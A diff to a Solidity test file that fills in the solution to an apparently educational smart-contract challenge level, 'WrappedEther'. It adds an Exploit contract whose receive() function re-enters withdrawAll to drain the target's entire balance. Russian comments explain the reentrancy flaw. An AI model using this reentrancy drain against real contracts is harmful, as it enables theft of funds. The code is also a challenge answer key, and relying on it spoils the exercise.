@@ -16,12 +16,29 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Exploit exploit = new Exploit();
+        exploit.attack{value: 0.09 ether}(instance);
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+}
+
+contract Exploit {
+    // депозит и сразу все выводим
+    function attack(WrappedEther instance) payable external {
+        instance.deposit{value:msg.value}(address(this));
+        instance.withdrawAll();
+    }
+
+    // уязвимость в том, что во время вывода withdrawAll сначала вызывается эта функция recieve, а только потом уменьшается баланс. 
+    // мы можем в этой же функции опять вызвать вывод, что приведет к повторному выводу до уменьшения баланса
+    receive() external payable {
+        if (msg.sender.balance > 0) {
+            WrappedEther(msg.sender).withdrawAll();
+        }
     }
 }
